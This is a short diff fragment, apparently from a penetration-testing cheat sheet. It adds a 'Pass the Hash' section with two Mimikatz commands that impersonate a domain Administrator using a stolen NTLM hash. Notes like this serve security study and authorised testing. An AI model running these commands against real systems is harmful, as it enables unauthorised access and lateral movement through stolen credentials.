@@ -61,6 +61,14 @@ crackstation.net
 - The machine's protections prevent access to the token.
 
 ---
+### **Pass the Hash**
+```
+privilege::debug
+sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:<NTLM_HASH>
+```
+
+---
+
 
 ```
 log
